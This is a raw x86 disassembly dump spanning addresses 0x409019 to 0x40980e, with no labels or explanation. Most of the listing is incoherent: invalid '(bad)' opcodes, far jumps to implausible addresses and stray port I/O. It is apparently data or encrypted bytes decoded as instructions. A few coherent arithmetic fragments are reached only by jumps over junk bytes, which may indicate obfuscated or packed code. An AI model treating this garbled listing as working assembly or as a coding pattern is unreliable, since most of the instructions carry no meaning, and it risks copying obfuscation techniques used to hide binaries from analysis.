  409019:	les    ebp,FWORD PTR [eax+0x4c5e6001]
  40901f:	clc    
  409020:	dec    edi
  409021:	pop    ds
  409022:	test   dh,ah
  409024:	je     0x409058
  409026:	jmp    0x83ca90be
  40902b:	xor    DWORD PTR gs:[ebx+eax*2],edx
  40902f:	jbe    0x409086
  409031:	arpl   WORD PTR [esi+0x4f6eeab3],sp
  409037:	sub    esp,DWORD PTR [ebx+0x2129243d]
  40903d:	loope  0x40900a
  40903f:	fistp  WORD PTR [ebx+0x760bcabe]
  409045:	or     DWORD PTR [ebp-0x1ace2de1],esp
  40904b:	adc    DWORD PTR [edx],edi
  40904d:	pop    edx
  40904e:	(bad)  
  40904f:	aad    0x2e
  409051:	jnp    0x409022
  409053:	cmc    
  409054:	outs   dx,DWORD PTR ds:[esi]
  409055:	jb     0x409092
  409057:	ins    DWORD PTR es:[edi],dx
  409058:	inc    edi
  409059:	gs push ebx
  40905b:	adc    DWORD PTR [ebp+edi*2+0x720bfc11],0xffffff95
  409063:	call   0x12256e72
  409068:	or     DWORD PTR [ecx-0x38],edx
  40906b:	aaa    
  40906c:	sbb    DWORD PTR [esi],esi
  40906e:	comiss xmm4,DWORD PTR [esi+0x47cccf6a]
  409075:	fisttp DWORD PTR [edi+0x7a]
  409078:	pop    ebp
  409079:	push   ss
  40907a:	xor    eax,ebp
  40907c:	in     eax,0x81
  40907e:	push   esp
  409080:	push   es
  409081:	pop    ds
  409082:	dec    esi
  409083:	dec    ebp
  409084:	add    DWORD PTR [ebp-0x74],0x1
  409088:	icebp  
  409089:	push   ebx
  40908a:	pop    eax
  40908b:	dec    ebx
  40908c:	aam    0x7c
  40908e:	mov    es,WORD PTR [ecx+0x46c5210]
  409094:	es dec edx
  409096:	std    
  409097:	push   eax
  409098:	arpl   WORD PTR cs:[esi-0x25fc2dbe],bp
  40909f:	dec    ecx
  4090a0:	popa   
  4090a1:	leave  
  4090a2:	dec    ebx
  4090a3:	repnz and BYTE PTR [eax+0x32],dl
  4090a7:	cmp    BYTE PTR [esi-0x5f],bl
  4090aa:	add    dl,BYTE PTR [ebx]
  4090ac:	sahf   
  4090ad:	ror    BYTE PTR [edi],1
  4090af:	rcl    DWORD PTR [ebp-0x68],cl
  4090b2:	cmp    al,0x26
  4090b4:	fsub   QWORD PTR [edi+0x39]
  4090b7:	sahf   
  4090b8:	xchg   edx,eax
  4090b9:	xor    DWORD PTR [ebx-0x2a],0xc149cf8
  4090c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090c1:	into   
  4090c2:	test   dx,cx
  4090c5:	pop    ss
  4090c6:	int    0xfb
  4090c8:	cmp    edx,DWORD PTR [eax]
  4090ca:	mov    ebp,0x571e3fd5
  4090cf:	mov    eax,0xc7f03bb4
  4090d4:	add    eax,0x42a801
  4090d9:	jne    0x409156
  4090db:	add    BYTE PTR [eax],al
  4090dd:	jne    0x4093c9
  4090e3:	jmp    0x4093a9
  4090e8:	retf   0xd0cb
  4090eb:	cmp    eax,0xcbd9d1d5
  4090f0:	mov    edx,0xa7a4c6c4
  4090f5:	mov    bl,0xe
  4090f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090f8:	mov    gs,edi
  4090fa:	js     0x409174
  4090fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090fd:	jle    0x409177
  4090ff:	js     0x409180
  409101:	sub    al,0x92
  409103:	pop    edx
  409104:	out    dx,eax
  409105:	aam    0xc1
  409107:	int3   
  409108:	(bad)  
  40910a:	(bad)  
  40910b:	aad    0x4f
  40910d:	mov    al,0x78
  40910f:	xchg   ecx,eax
  409110:	mov    dh,0x2b
  409112:	rcr    BYTE PTR [edx-0x8],0xd6
  409116:	shl    ecx,0x30
  409119:	mov    ebp,0x694ae401
  40911e:	lahf   
  40911f:	adc    al,0x6a
  409121:	mov    al,0x8a
  409123:	mov    eax,ds:0x60c8082f
  409128:	icebp  
  409129:	cmp    eax,0x393eb56b
  40912e:	xor    eax,0x7c5b53db
  409133:	inc    ebp
  409134:	out    0xca,al
  409136:	int3   
  409137:	sub    ebp,ecx
  409139:	cmp    edx,DWORD PTR [esi+0x885ede2]
  40913f:	sub    BYTE PTR [edx],bl
  409141:	rol    BYTE PTR [ebx],1
  409143:	jmp    0xce5505b1
  409148:	pusha  
  409149:	push   esp
  40914a:	mov    ds:0xfc3a57c2,al
  40914f:	call   0xe48c:0x6f4a3e39
  409156:	adc    al,0x81
  409158:	jmp    0x7c53:0x1f486b1c
  40915f:	pop    esp
  409160:	dec    ebx
  409161:	add    DWORD PTR [ebp+edi*1+0x1],ebp
  409165:	shl    DWORD PTR [ecx-0x61c4fd35],0x2f
  40916c:	mov    esi,DWORD PTR [ecx-0x4cb04008]
  409172:	sub    bl,BYTE PTR [edx]
  409174:	cmc    
  409175:	ret    0x2c2f
  409178:	mov    dh,0x8b
  40917a:	aam    0x57
  40917c:	mov    dh,BYTE PTR [edx+0xed777c2]
  409182:	pop    ebx
  409183:	(bad)  
  409184:	dec    esi
  409185:	add    dl,dl
  409187:	mov    eax,ds:0x6a17d55f
  40918c:	aaa    
  40918d:	cmp    DWORD PTR [ecx+ecx*8+0x1e25df33],ecx
  409194:	cmp    BYTE PTR [ebx],ah
  409196:	es test al,0x5
  409199:	js     0x4091cb
  40919b:	dec    edi
  40919c:	shl    DWORD PTR [eax],1
  40919e:	or     al,0x43
  4091a0:	mov    esp,0xc1a6c462
  4091a5:	sub    ah,al
  4091a7:	xchg   DWORD PTR [ecx-0x1f],edx
  4091aa:	shr    BYTE PTR [edx+0x547693c9],0x8c
  4091b1:	rol    esp,cl
  4091b3:	fisttp WORD PTR [ebp+edi*2+0x39733eab]
  4091ba:	aam    0x97
  4091bc:	outs   dx,DWORD PTR ds:[esi]
  4091bd:	pushf  
  4091be:	jo     0x409170
  4091c0:	jg     0x4091cb
  4091c2:	inc    ebx
  4091c3:	popa   
  4091c4:	jbe    0x40917b
  4091c6:	(bad)  
  4091c7:	rol    BYTE PTR [ecx+0x7f],cl
  4091ca:	int    0x59
  4091cc:	fimul  WORD PTR [edi+edi*1+0x6e190cf6]
  4091d3:	dec    edi
  4091d4:	or     eax,0x6dc73f75
  4091d9:	jbe    0x409222
  4091db:	xor    edi,DWORD PTR [edx+0x1905f57]
  4091e1:	cmp    BYTE PTR [edi],bl
  4091e3:	test   al,0x23
  4091e5:	mov    eax,0xcd5a7be1
  4091ea:	test   DWORD PTR [ebp+0x3101b74],edx
  4091f0:	stos   BYTE PTR es:[edi],al
  4091f1:	loop   0x409181
  4091f3:	(bad)  
  4091f5:	push   ds
  4091f6:	jl     0x409275
  4091f8:	in     al,dx
  4091f9:	and    al,dl
  4091fb:	scas   al,BYTE PTR es:[edi]
  4091fc:	jae    0x4091f0
  4091fe:	and    BYTE PTR [ecx-0x292bc0e3],al
  409204:	loope  0x409191
  409206:	adc    ah,al
  409208:	(bad)  es:[esi]
  40920b:	ror    DWORD PTR [ecx],1
  40920d:	test   edi,ebp
  40920f:	and    BYTE PTR [edx-0x3251004e],ah
  409215:	je     0x409240
  409217:	jns    0x409245
  409219:	jno    0x409264
  40921b:	(bad)  
  40921c:	mov    esi,0x4f5ed56f
  409221:	pop    ds
  409222:	fs sub ebx,esi
  409225:	xchg   ecx,eax
  409226:	pop    es
  409227:	(bad)  
  409228:	adc    ebp,DWORD PTR [edx]
  40922a:	jmp    0x409201
  40922c:	cmp    BYTE PTR [edi+0x6b],ah
  40922f:	sub    eax,0xa0a272b5
  409234:	inc    esp
  409235:	lock mov ebx,0x99f2d3d
  40923b:	enter  0xa52d,0x44
  40923f:	clc    
  409240:	sub    edi,0xffffffce
  409243:	lods   eax,DWORD PTR ds:[esi]
  409244:	or     ch,BYTE PTR [eax+0xe]
  409247:	mov    bl,0x97
  409249:	fsub   QWORD PTR [ebx-0x31]
  40924c:	jnp    0x409200
  40924e:	mov    cl,0x8e
  409250:	sbb    al,0xe7
  409252:	sbb    dh,BYTE PTR [edx]
  409254:	cmp    BYTE PTR [ebx],ah
  409256:	les    ebx,FWORD PTR ds:0x9f614477
  40925c:	xchg   ebp,eax
  40925d:	mov    ecx,0xb7a39ade
  409262:	adc    DWORD PTR ds:0x4500c80f,esi
  409268:	xor    al,0xa
  40926a:	mov    dh,0x9e
  40926c:	adc    BYTE PTR [edx],dl
  40926e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40926f:	repz call 0x5ce40110
  409275:	adc    BYTE PTR [ebp-0x1f7ac14f],ch
  40927b:	and    eax,0xd2d10eb1
  409280:	fdiv   DWORD PTR [eax+eiz*8]
  409283:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409284:	stc    
  409285:	(bad)  
  409286:	pop    ss
  409287:	(bad)  
  409289:	es gs dec edx
  40928c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40928d:	inc    edi
  40928e:	push   0xffffffc7
  409290:	xchg   edx,eax
  409291:	call   0x41ca:0xea53cd8b
  409298:	jl     0x4092a6
  40929a:	dec    edi
  40929b:	mov    ebp,0xe10f8f1c
  4092a0:	cmp    esp,DWORD PTR [ebx]
  4092a2:	cmp    eax,0xe82a0f26
  4092a7:	data16 ficom WORD PTR [ebx]
  4092aa:	and    bh,BYTE PTR [eax+ebx*1-0x4e]
  4092ae:	pop    ebx
  4092af:	jl     0x409318
  4092b1:	pop    es
  4092b2:	loopne 0x409331
  4092b4:	and    eax,0xbac267fe
  4092b9:	mov    al,ds:0x7c80248b
  4092be:	cli    
  4092bf:	jns    0x4092cf
  4092c1:	pusha  
  4092c2:	int    0x14
  4092c4:	xor    DWORD PTR ds:0x5e0417cc,ebp
  4092ca:	addr16 cdq 
  4092cc:	ret    
  4092cd:	test   al,0xc8
  4092cf:	(bad)  
  4092d0:	xchg   esp,eax
  4092d1:	dec    esp
  4092d2:	or     al,0x35
  4092d4:	adc    dh,bl
  4092d6:	adc    DWORD PTR [edi+0x5f51a626],esp
  4092dc:	pop    ecx
  4092dd:	jg     0x4092b9
  4092df:	aam    0x48
  4092e1:	push   ss
  4092e2:	mov    ah,0x1
  4092e4:	sbb    al,0xd8
  4092e6:	outs   dx,DWORD PTR ds:[esi]
  4092e7:	(bad)  
  4092e8:	jae    0x40927f
  4092ea:	and    bh,BYTE PTR [edx+0x5794dbc6]
  4092f0:	les    ecx,FWORD PTR [esi-0x13]
  4092f3:	stos   DWORD PTR es:[edi],eax
  4092f4:	sub    al,0x1a
  4092f6:	pop    ss
  4092f7:	inc    esi
  4092f8:	loope  0x4092c9
  4092fa:	sbb    BYTE PTR [ecx-0x6d],cl
  4092fd:	push   ss
  4092fe:	xchg   ebp,eax
  4092ff:	or     bl,BYTE PTR [eax+0xf]
  409302:	nop
  409303:	test   BYTE PTR [ecx-0x59283e3b],ah
  409309:	fcomp  QWORD PTR [ebp-0x2e14220c]
  40930f:	inc    esp
  409310:	inc    ebx
  409311:	cwde   
  409312:	xor    ch,BYTE PTR [edi]
  409314:	add    BYTE PTR [ebp-0x28151a67],dl
  40931a:	sub    esi,DWORD PTR [ecx-0x7]
  40931d:	ins    DWORD PTR es:[edi],dx
  40931e:	imul   ebp,DWORD PTR [edx-0x66],0x7d
  409322:	pop    edx
  409323:	fidivr WORD PTR ds:0xb7b8df3d
  409329:	inc    edx
  40932a:	mov    DWORD PTR [eax-0x4f],edx
  40932d:	mov    dh,0x4c
  40932f:	dec    edx
  409330:	daa    
  409331:	enter  0x8ca0,0x52
  409335:	add    eax,0xc12d8689
  40933a:	(bad)  [edi-0x26]
  40933d:	in     eax,dx
  40933e:	dec    edx
  40933f:	jle    0x4092e4
  409341:	mov    eax,ds:0x83ed474a
  409346:	cmp    DWORD PTR [edi+0x27d287d9],0x6f
  40934d:	fs jl  0x4093c5
  409350:	pop    eax
  409351:	shl    DWORD PTR [esi+0x6d],cl
  409354:	jbe    0x409393
  409356:	dec    ebp
  409357:	inc    edx
  409358:	sub    BYTE PTR [edx],al
  40935a:	ficomp DWORD PTR [ebx-0x38b173a7]
  409360:	push   0xd3f3f5ad
  409365:	(bad)  
  409366:	ror    BYTE PTR [eax+0x24],0xc4
  40936a:	xor    DWORD PTR [ebp+0x58],esp
  40936d:	imul   ebp,DWORD PTR [ecx-0x15237a14],0x28cfebd
  409377:	adc    DWORD PTR [ebp-0x30],edi
  40937a:	dec    eax
  40937b:	mov    edi,DWORD PTR [ecx-0x4f]
  40937e:	(bad)  
  40937f:	fs jbe 0x40938f
  409382:	js     0x409350
  409384:	sbb    bl,BYTE PTR [edx+edx*1]
  409387:	enter  0xf6df,0xfa
  40938b:	clc    
  40938c:	mov    eax,DWORD PTR [ebx+0x57]
  40938f:	jp     0x409332
  409391:	dec    edi
  409392:	ret    
  409393:	fldcw  WORD PTR [edi]
  409395:	cmp    dh,BYTE PTR [eax]
  409397:	push   0x2ef97bcd
  40939c:	push   esi
  40939d:	adc    eax,0x928ab7c0
  4093a2:	push   esi
  4093a3:	add    DWORD PTR [ebx+0x5d39c47a],ebp
  4093a9:	mov    eax,DWORD PTR [ebp-0x4]
  4093ac:	add    DWORD PTR ds:0x42a7b9,0x42a769
  4093b6:	mov    esi,DWORD PTR [ebp-0x8]
  4093b9:	xor    eax,edx
  4093bb:	xor    esi,edx
  4093bd:	add    eax,ecx
  4093bf:	add    esi,ecx
  4093c1:	imul   eax,esi
  4093c4:	jmp    0x4096ca
  4093c9:	mov    eax,DWORD PTR [ebp+0xc]
  4093cc:	mov    eax,DWORD PTR [eax+0x78]
  4093cf:	mov    DWORD PTR [ebp+0xc],eax
  4093d2:	mov    eax,DWORD PTR [ebp-0x4]
  4093d5:	mov    esi,DWORD PTR [ebp-0x8]
  4093d8:	xor    eax,edx
  4093da:	xor    esi,edx
  4093dc:	add    eax,ecx
  4093de:	add    esi,ecx
  4093e0:	imul   eax,esi
  4093e3:	mov    esi,DWORD PTR [ebp+0xc]
  4093e6:	cmp    esi,eax
  4093e8:	jmp    0x4096ae
  4093ed:	xlat   BYTE PTR ds:[ebx]
  4093ee:	leave  
  4093ef:	retf   0xdad6
  4093f2:	aad    0xdb
  4093f4:	leave  
  4093f5:	adc    bl,BYTE PTR ds:0xea7cff3d
  4093fb:	pop    esi
  4093fc:	cmp    al,0x35
  4093fe:	in     al,dx
  4093ff:	js     0x409479
  409401:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409402:	jle    0x40947c
  409404:	js     0x4093f7
  409406:	sub    DWORD PTR [ecx],ebp
  409408:	into   
  409409:	mov    ebx,0x85196ef0
  40940e:	ins    DWORD PTR es:[edi],dx
  40940f:	mov    ss,edx
  409411:	dec    edi
  409412:	mov    al,ds:0x5385073c
  409417:	in     eax,0xf8
  409419:	(bad)  
  40941b:	in     al,dx
  40941c:	loopne 0x40942d
  40941e:	stos   BYTE PTR es:[edi],al
  40941f:	push   edx
  409420:	jmp    0x409466
  409422:	pushf  
  409423:	mov    bh,0xec
  409425:	sub    ebp,DWORD PTR ds:[esi]
  409428:	popf   
  409429:	xchg   ebp,eax
  40942a:	jecxz  0x4093ee
  40942c:	mov    edx,0xba5a4eb9
  409431:	clc    
  409432:	outs   dx,BYTE PTR ds:[esi]
  409433:	lods   eax,DWORD PTR ds:[esi]
  409434:	scas   al,BYTE PTR es:[edi]
  409435:	adc    eax,0xd2f4f883
  40943a:	inc    ebp
  40943b:	mov    edi,0xc854fc63
  409440:	jbe    0x409400
  409442:	cmp    bh,al
  409444:	push   0xffffffa6
  409446:	push   0xfdc4c671
  40944b:	mov    WORD PTR [edi+0x55],?
  40944e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40944f:	mov    al,ds:0x43346799
  409454:	(bad)  
  409455:	cmp    eax,0x7730ffd2
  40945a:	xor    edx,DWORD PTR [eax+ebx*4]
  40945d:	dec    edi
  40945e:	fnstcw WORD PTR [ecx+0x17]
  409461:	shr    esp,cl
  409463:	pop    esp
  409464:	fnstsw WORD PTR [edi]
  409466:	mov    ds:0x23f0d59a,eax
  40946b:	jmp    0x1e37d5b3
  409470:	shl    al,0xdd
  409473:	(bad)  
  409474:	sbb    esp,eax
  409476:	ins    DWORD PTR es:[edi],dx
  409477:	mov    ebp,0xa93605b0
  40947c:	mov    eax,ds:0xa8fd2d5a
  409481:	popf   
  409482:	out    dx,eax
  409483:	ja     0x40947a
  409485:	shl    DWORD PTR [esi],cl
  409487:	cs stos DWORD PTR es:[edi],eax
  409489:	mov    esp,0xc435595f
  40948e:	xor    al,0x7f
  409490:	add    edx,DWORD PTR [esi]
  409492:	fdiv   DWORD PTR [edi+0x2fa3828f]
  409498:	stos   DWORD PTR es:[edi],eax
  409499:	and    cl,bl
  40949b:	or     eax,0xec3427be
  4094a0:	fild   DWORD PTR [edi]
  4094a2:	ja     0x409441
  4094a4:	es adc ecx,edi
  4094a7:	pop    edx
  4094a8:	cwde   
  4094a9:	pop    ds
  4094aa:	mov    esi,0x53e40765
  4094af:	idiv   ebx
  4094b1:	jns    0x409489
  4094b3:	lea    edx,ds:0x512ba36b
  4094b9:	and    esp,DWORD PTR [bp+0x70]
  4094bd:	(bad)  
  4094be:	repz cli 
  4094c0:	xchg   esi,esp
  4094c2:	arpl   WORD PTR [edi+0x46],bx
  4094c5:	push   0xc4b4f37
  4094ca:	xor    dl,ch
  4094cc:	xchg   edx,eax
  4094cd:	jle    0x4094ed
  4094cf:	mov    dh,0xa9
  4094d1:	jo     0x4094c0
  4094d3:	rol    al,1
  4094d5:	cmp    esi,DWORD PTR [ebx+ebp*8+0xa3b75a7]
  4094dc:	shl    DWORD PTR [edi+eiz*2-0x3b],1
  4094e0:	xor    al,0x91
  4094e2:	jnp    0x409489
  4094e4:	push   ss
  4094e5:	mov    ah,0xa6
  4094e7:	gs daa 
  4094e9:	and    al,0x56
  4094eb:	sub    ebp,ebp
  4094ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094ee:	fcomp  QWORD PTR [ecx]
  4094f0:	or     ecx,edi
  4094f2:	add    ecx,DWORD PTR [ebx]
  4094f4:	push   cs
  4094f5:	xchg   ebx,eax
  4094f6:	mov    ah,BYTE PTR [ecx+0x24b0c5cd]
  4094fc:	ds mov ecx,0xa2c56d81
  409502:	or     al,0x9c
  409504:	int3   
  409505:	sbb    DWORD PTR [ecx+0x236e9e37],ebx
  40950b:	stc    
  40950c:	rcr    DWORD PTR [edx-0x434eaba2],0x80
  409513:	test   al,0x9a
  409515:	lea    ebx,[eax+0x9]
  409518:	jecxz  0x40951b
  40951a:	xchg   esp,eax
  40951b:	bound  ecx,QWORD PTR [ebp-0x2a7e16cc]
  409521:	stos   DWORD PTR es:[edi],eax
  409522:	sub    edi,0xffffffd1
  409525:	aam    0x87
  409527:	aad    0x60
  409529:	xor    DWORD PTR [edx-0x5a],ebx
  40952c:	xchg   esp,eax
  40952d:	adc    BYTE PTR [edi+edx*8-0xc],ch
  409531:	dec    ebx
  409532:	outs   dx,BYTE PTR ds:[esi]
  409533:	mov    esp,0xa595eac4
  409538:	ret    
  409539:	cdq    
  40953a:	push   esp
  40953b:	(bad)  
  40953c:	adc    al,BYTE PTR [ecx+0x4]
  40953f:	and    edx,ecx
  409541:	in     eax,dx
  409542:	cmp    eax,DWORD PTR [edi+0x22]
  409545:	mov    ebp,0xbfaf86cc
  40954a:	xchg   DWORD PTR [edi],edi
  40954c:	fs mov gs,ebp
  40954f:	popa   
  409550:	pop    edx
  409551:	mov    edx,0x40654f05
  409556:	jl     0x4095d1
  409558:	test   BYTE PTR [eax],bl
  40955a:	xor    eax,0x23e1dcc0
  40955f:	scas   al,BYTE PTR es:[edi]
  409560:	aaa    
  409561:	xchg   esp,eax
  409562:	ret    0x896d
  409565:	inc    esi
  409566:	scas   al,BYTE PTR es:[edi]
  409567:	mov    bl,0x17
  409569:	inc    esi
  40956a:	aaa    
  40956b:	and    eax,0x8703d357
  409570:	js     0x409586
  409572:	cli    
  409573:	mov    bl,0x4c
  409575:	jno    0x409596
  409577:	sahf   
  409578:	push   eax
  409579:	loope  0x40952e
  40957b:	popw   ds
  40957d:	xchg   edx,eax
  40957e:	push   ebp
  40957f:	mov    eax,0x8b7cc00
  409584:	xor    eax,0x6d82170b
  409589:	loopne 0x4095b8
  40958b:	xchg   esi,eax
  40958c:	xchg   edi,eax
  40958d:	jae    0x409606
  40958f:	mov    ds:0xeec60f7d,eax
  409594:	sub    cl,BYTE PTR [edi]
  409596:	xor    esp,ebx
  409598:	(bad)  
  409599:	cmp    BYTE PTR ds:0xfa866bf2,bl
  40959f:	add    al,0x1f
  4095a1:	retf   0x3f9b
  4095a4:	stos   DWORD PTR es:[edi],eax
  4095a5:	pusha  
  4095a6:	leave  
  4095a7:	aad    0x2c
  4095a9:	cmp    BYTE PTR [edi+0x2a911e9],bh
  4095af:	test   esp,eax
  4095b1:	xchg   esi,eax
  4095b2:	mov    al,0x5b
  4095b4:	cli    
  4095b5:	push   cs
  4095b6:	sub    eax,ebp
  4095b8:	push   ds
  4095b9:	inc    ebx
  4095ba:	xor    DWORD PTR [ecx-0x6294b6bc],edi
  4095c0:	sbb    eax,esp
  4095c2:	push   cs
  4095c3:	jnp    0x4095f3
  4095c5:	mov    ah,0xbf
  4095c7:	test   esp,ecx
  4095c9:	mov    ebp,0x845355b
  4095ce:	sub    eax,0x707cd580
  4095d3:	mov    eax,ds:0x4d6ca299
  4095d8:	call   0xce6c1396
  4095dd:	loop   0x4095a4
  4095df:	cmp    al,0x5a
  4095e1:	jp     0x409628
  4095e3:	adc    dh,BYTE PTR [edx]
  4095e5:	mov    edi,0xfd1c13e3
  4095ea:	dec    esi
  4095eb:	rol    BYTE PTR [esi],cl
  4095ed:	or     BYTE PTR [eax+0x365e1b05],dh
  4095f3:	mov    eax,gs:0x687a431b
  4095f9:	(bad)  
  4095fa:	jp     0x409607
  4095fc:	push   es
  4095fd:	repz (bad) 
  4095ff:	add    ebp,DWORD PTR gs:[ecx-0x12]
  409603:	lea    ecx,[esi+0x63]
  409606:	cmp    esi,DWORD PTR [edi+eax*1]
  409609:	pop    ds
  40960a:	cmp    eax,0x5c6d2234
  40960f:	xor    eax,0x5051485a
  409614:	mov    bh,0x94
  409616:	cmp    eax,0xe6d52c22
  40961b:	mov    ah,0x65
  40961d:	sub    dh,BYTE PTR [edx]
  40961f:	aam    0x3f
  409621:	iret   
  409622:	(bad)  
  409623:	cdq    
  409624:	ror    edi,0x9f
  409627:	push   edx
  409628:	sub    bl,cl
  40962a:	xchg   edx,eax
  40962b:	or     DWORD PTR [esi+0xdbe2e83],esp
  409631:	dec    edx
  409632:	mov    ds:0x23fce01d,eax
  409637:	in     eax,dx
  409638:	in     al,0x2a
  40963a:	mov    edx,0x688bb45f
  40963f:	push   ss
  409640:	xchg   ebp,esi
  409642:	jb     0x4095c6
  409644:	pop    es
  409645:	sar    bl,cl
  409647:	add    DWORD PTR [ecx+0x5b],0x7e
  40964b:	pop    eax
  40964c:	mov    ds:0xb7519de4,eax
  409651:	ja     0x40962a
  409653:	sti    
  409654:	scas   eax,DWORD PTR es:[edi]
  409655:	dec    esi
  409656:	mov    eax,ds:0xf5caf225
  40965c:	mov    esi,0x2ba1d1d7
  409661:	add    DWORD PTR [eax+ebp*8-0x25380e2e],edx
  409668:	stos   DWORD PTR es:[edi],eax
  409669:	sub    BYTE PTR [edx],ch
  40966b:	aad    0x6c
  40966d:	dec    eax
  40966e:	retf   0xc96a
  409671:	scas   eax,DWORD PTR es:[edi]
  409672:	mov    bl,0x3a
  409674:	cli    
  409675:	stc    
  409676:	idiv   DWORD PTR [esi-0xff9dbc4]
  40967c:	push   esi
  40967d:	jo     0x409663
  40967f:	jecxz  0x4096ce
  409681:	push   ds
  409682:	sbb    esp,DWORD PTR [eax+0x7e]
  409685:	popf   
  409686:	mov    dl,0x14
  409688:	fst    DWORD PTR [edi-0x44]
  40968b:	xchg   bh,ch
  40968d:	das    
  40968e:	aaa    
  40968f:	xchg   edx,eax
  409690:	xor    ch,BYTE PTR [eax-0x4f]
  409693:	fstp   DWORD PTR [esp+ebp*8-0x4733c0ab]
  40969a:	pushf  
  40969b:	icebp  
  40969c:	jg     0x409677
  40969e:	ins    BYTE PTR es:[edi],dx
  40969f:	leave  
  4096a0:	and    eax,0xd9a0a8fc
  4096a5:	and    BYTE PTR [edx-0x2],al
  4096a8:	jmp    0x8bc6:0x915acea
  4096af:	inc    ebp
  4096b0:	cld    
  4096b1:	je     0x4093ac
  4096b7:	xor    eax,edx
  4096b9:	add    eax,ecx
  4096bb:	mov    ecx,DWORD PTR [ebp+0xc]
  4096be:	imul   eax,ecx
  4096c1:	add    eax,DWORD PTR [ebp+0x8]
  4096c4:	mov    DWORD PTR [ebp+0xc],eax
  4096c7:	mov    eax,DWORD PTR [ebp+0xc]
  4096ca:	pop    esi
  4096cb:	leave  
  4096cc:	ret    0x8
  4096cf:	push   ebp
  4096d0:	mov    ebp,esp
  4096d2:	jmp    0x4099c5
  4096d7:	leave  
  4096d8:	enter  0x3ed6,0xd9
  4096dc:	(bad)  
  4096dd:	(bad)  
  4096df:	xlat   BYTE PTR ds:[ebx]
  4096e0:	enter  0xc218,0xfc
  4096e4:	push   esp
  4096e5:	push   0xffffffeb
  4096e7:	pop    esp
  4096e8:	bnd js 0x409763
  4096eb:	push   edx
  4096ec:	jle    0x409766
  4096ee:	js     0x409696
  4096f0:	daa    
  4096f1:	push   es
  4096f2:	mov    BYTE PTR ss:[edi-0x21],bh
  4096f6:	addr16 mov edi,0x98e183fd
  4096fc:	mov    ch,0x9c
  4096fe:	adc    al,0x56
  409700:	sti    
  409701:	dec    esp
  409702:	lods   eax,DWORD PTR ds:[esi]
  409703:	push   0x79
  409705:	or     bh,BYTE PTR [edx+0x7116634d]
  40970b:	repnz aaa 
  40970d:	pop    ebp
  40970e:	es scas eax,DWORD PTR es:[edi]
  409710:	test   BYTE PTR [ebp+edi*8+0x3852dbab],al
  409717:	in     al,0x8c
  409719:	dec    ebx
  40971a:	sbb    DWORD PTR ds:0xd8309c9c,esi
  409720:	inc    esp
  409721:	jl     0x409719
  409723:	adc    dh,BYTE PTR [ecx+edx*8-0x7d1d9633]
  40972a:	jo     0x4096d8
  40972c:	jnp    0x4097a9
  40972e:	sbb    dh,dh
  409730:	ja     0x40978c
  409732:	lods   al,BYTE PTR ds:[esi]
  409733:	fwait
  409734:	not    BYTE PTR [bp+di]
  409737:	mov    bl,BYTE PTR [ecx]
  409739:	les    ebx,FWORD PTR [eax+0x45]
  40973c:	jnp    0x409794
  40973e:	cmp    ebx,ecx
  409740:	mov    ecx,0xd453f1a6
  409745:	push   ebx
  409746:	xor    esi,DWORD PTR [edi+0x2c]
  409749:	int3   
  40974a:	fcomp  DWORD PTR [esp+eiz*4+0x6b2dc562]
  409751:	cmp    cl,ch
  409753:	es jmp 0xc535dd27
  409759:	loop   0x4097cc
  40975b:	mov    ch,0x3
  40975d:	sahf   
  40975e:	retf   
  40975f:	ret    
  409760:	mov    esi,0xce84c025
  409765:	outs   dx,BYTE PTR ds:[esi]
  409766:	ficomp WORD PTR [eax]
  409768:	lock outs dx,BYTE PTR ds:[esi]
  40976a:	pop    edx
  40976b:	loop   0x409779
  40976d:	mov    ds:0x6443396a,eax
  409772:	aas    
  409773:	in     eax,dx
  409774:	fs dec eax
  409776:	test   DWORD PTR [edi+ebp*8+0x3a],esi
  40977a:	mov    edi,0x832736b9
  40977f:	je     0x409799
  409781:	inc    ebx
  409782:	mov    ah,0x2b
  409784:	sar    DWORD PTR [edx],0x54
  409787:	dec    edi
  409788:	lds    edi,FWORD PTR [ecx-0x67]
  40978b:	sub    DWORD PTR [edx*8+0x74209421],esi
  409792:	enter  0x720a,0xbc
  409796:	xchg   esi,eax
  409797:	mov    ebx,0xfa805546
  40979c:	mov    esi,0xcaca9f7e
  4097a1:	aam    0x9
  4097a3:	outs   dx,DWORD PTR ds:[esi]
  4097a4:	and    DWORD PTR [ebp+0x6c],ebp
  4097a7:	jbe    0x4097c1
  4097a9:	aam    0x5b
  4097ab:	xchg   ecx,eax
  4097ac:	sbb    BYTE PTR [ebx],0x66
  4097af:	sbb    ah,BYTE PTR [ecx]
  4097b1:	aam    0xc7
  4097b3:	into   
  4097b4:	pop    ebx
  4097b5:	jns    0x409823
  4097b7:	jns    0x409823
  4097b9:	pop    es
  4097ba:	inc    esi
  4097bb:	int    0xde
  4097bd:	jp     0x4097ab
  4097bf:	enter  0x69ef,0x48
  4097c3:	xor    BYTE PTR [edi+0x6e85037e],bh
  4097c9:	ret    
  4097ca:	mov    dh,0x7b
  4097cc:	dec    esi
  4097cd:	sbb    esi,DWORD PTR [ebx-0x7a]
  4097d0:	jg     0x4097eb
  4097d2:	inc    esi
  4097d3:	xchg   esi,eax
  4097d4:	ins    BYTE PTR es:[edi],dx
  4097d5:	xor    BYTE PTR [ebp+0x58],0x4e
  4097d9:	in     al,0x13
  4097db:	test   eax,0x6635f529
  4097e0:	push   esp
  4097e1:	or     al,BYTE PTR [ebx]
  4097e3:	not    DWORD PTR [eax]
  4097e5:	inc    esp
  4097e6:	imul   eax,DWORD PTR [edx+0x76],0x40
  4097ea:	ret    0xe3b2
  4097ed:	cmp    eax,edx
  4097ef:	add    al,0xa8
  4097f1:	xor    al,0xef
  4097f3:	add    BYTE PTR [ecx-0x2d],0xb0
  4097f7:	inc    eax
  4097f8:	lahf   
  4097f9:	out    0xf2,al
  4097fb:	mov    esp,0x8f4f3baa
  409800:	lahf   
  409801:	leave  
  409802:	dec    ecx
  409803:	pop    edx
  409804:	dec    eax
  409805:	xchg   edi,eax
  409806:	lea    ebx,[edx+ebp*4-0x135fc85c]
  40980d:	(bad)  
  40980e:	(bad)  
